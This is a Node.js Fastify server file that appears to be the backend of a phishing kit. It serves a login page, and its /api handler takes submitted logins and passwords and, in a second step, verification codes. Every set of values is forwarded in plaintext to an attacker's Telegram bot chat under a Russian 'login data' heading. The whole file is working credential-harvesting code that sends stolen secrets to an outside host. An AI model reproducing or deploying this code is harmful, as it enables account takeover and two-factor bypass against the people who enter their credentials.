const path = require("path");
const axios = require("axios");

const fastify = require("fastify")({
  logger: false,
});

fastify.register(require("@fastify/static"), {
  root: path.join(__dirname, "public"),
  prefix: "/",
});

fastify.register(require("@fastify/formbody"));

fastify.register(require("@fastify/view"), {
  engine: {
    handlebars: require("handlebars"),
  },
});

fastify.get("/", function (request, reply) {
  return reply.view("/src/pages/index.hbs");
});

fastify.post("/api", function (request, reply) {
  const CHAT_ID = process.env.CHAT_ID;
  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

  const currentDomain = request.headers.host;
  const { step, login, password } = request.body;

  if (step === 1) {
    let payload = {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: `<blockquote>Данные для входа 🔥</blockquote>\n
      🔑 Логин: <code>${login}</code>\n
      🔒 Пароль: <code>${password}</code>\n
        `,
    };
    axios.post(url, payload).catch((error) => {
      console.error("Error sending message:", error);
    });
  }

  if (step === 2) {
    let payload = {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: `<blockquote>Данные для входа 🔥</blockquote>\n
      🔑 Логин: <code>${login}</code>\n
      🔒 Пароль: <code>${password}</code>\n
      🔢 Код: <code>${request.body.code}</code>\n
      `,
    };
    axios.post(url, payload).catch((error) => {
      console.error("Error sending message:", error);
    });
  }

  return reply.send({
    message: "Received JSON",
    data: request.body,
  });
});

fastify.listen(
  { port: process.env.PORT, host: "0.0.0.0" },
  function (err, address) {
    if (err) {
      console.error(err);
      process.exit(1);
    }
    console.log(`Your app is listening on ${address}`);
  }
);
